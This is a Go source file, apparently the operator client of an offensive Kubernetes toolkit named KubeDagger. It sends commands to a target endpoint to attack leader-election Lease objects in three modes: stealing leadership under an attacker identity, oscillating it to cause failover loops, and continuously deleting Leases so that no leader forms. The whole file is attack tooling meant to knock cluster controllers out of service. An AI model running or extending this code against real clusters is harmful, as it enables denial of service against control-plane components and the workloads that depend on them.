package election_disrupt

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type DisruptResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool               `json:"success"`
}

func Execute(target, electionTarget, mode, output string) error {
	result := &DisruptResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch mode {
	case "steal":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"identify_lease", "locate current leader election Lease object for target component", "elect_find_lease"},
			{"acquire_lease", "force-update Lease with attacker identity to steal leadership", "elect_steal"},
			{"block_renew", "intercept lease renewal attempts from legitimate leader", "elect_block_renew"},
		}
	case "oscillate":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"identify_lease", "locate current leader election Lease object for target component", "elect_find_lease"},
			{"inject_jitter", "alternately steal and release lease causing rapid failover loops", "elect_oscillate"},
			{"monitor_chaos", "verify controllers are stuck in leader election thrashing", "elect_verify"},
		}
	default: // deny
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"identify_lease", "locate current leader election Lease object for target component", "elect_find_lease"},
			{"delete_lease", "continuously delete Lease object preventing any leader from forming", "elect_delete"},
			{"block_create", "intercept Lease creation attempts to maintain leaderless state", "elect_block_create"},
			{"verify_denial", "confirm target component has no active leader", "elect_verify_deny"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + electionTarget + "#" + mode
		status := shared.SendCommand(target, "/election_disrupt", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
